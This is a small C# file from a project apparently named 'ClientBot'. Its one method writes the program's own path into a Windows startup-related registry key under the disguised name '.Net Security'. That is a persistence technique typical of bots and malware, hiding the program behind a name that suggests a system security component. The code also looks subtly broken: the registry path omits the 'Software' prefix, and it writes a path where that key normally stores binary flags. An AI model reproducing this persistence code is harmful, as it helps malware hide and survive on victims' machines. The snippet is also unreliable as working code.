using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Windows.Forms;
namespace ClientBot
{
    class Initializer
    {
        public static bool startUp()
        {
            bool isOnStartUp = false;
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run", true);
            key.SetValue(".Net Security", Application.ExecutablePath.ToString());
            isOnStartUp = true;
            return isOnStartUp;
        }
    }
}
